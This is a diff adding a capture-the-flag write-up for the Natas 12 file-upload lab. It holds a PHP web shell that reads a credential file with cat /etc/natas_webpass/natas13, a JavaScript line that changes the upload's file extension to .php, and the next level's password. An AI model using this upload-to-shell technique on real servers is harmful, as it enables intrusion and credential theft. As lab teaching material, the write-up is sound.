@@ -1,0 +1,34 @@
+In this lab you are introduced to a simple form where you can choose a file to
+upload. I searched up a simple jpeg of pepe to upload. But this file was too
+big, the page said that the max file size is 1 KB. I used the imagemagick
+command to decrease the size to 50x50 and uploaded it. The web page then gave me
+a url and sure enough it was the same image I uploaded. Nothing too exciting
+with this web page.
+
+After looking at the source code I can see that there are three values that I
+may be able to change. I can change the hidden input element named "filename",
+the jpg file that I input, and maybe the $_FILES superglobal.
+
+I was stuck for quite a while just looking at this code. Really the only thing
+you can change is the file extension via the hidden input. You cannot edit the
+$_FILES variable because it is generated automatically by php. After searching
+online for a hint I saw a post saying that we can execute php by changing the
+file extension to .php and uploading our own php file. No where does the code
+check if you are actually uploading an image.
+
+There are four quick steps:
+
+1. Create a php file locally, I called it natas12.php on my local machine.
+
+<?php
+
+echo shell_exec("cat /etc/natas_webpass/natas13");
+
+2. Upload the file with the form.
+
+3. Change the hidden input filename value with JavaScript:
+   document.getElementsByName('filename')[0].value = '.php';
+
+4. Click on the link provided.
+
+natas13 password: jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY
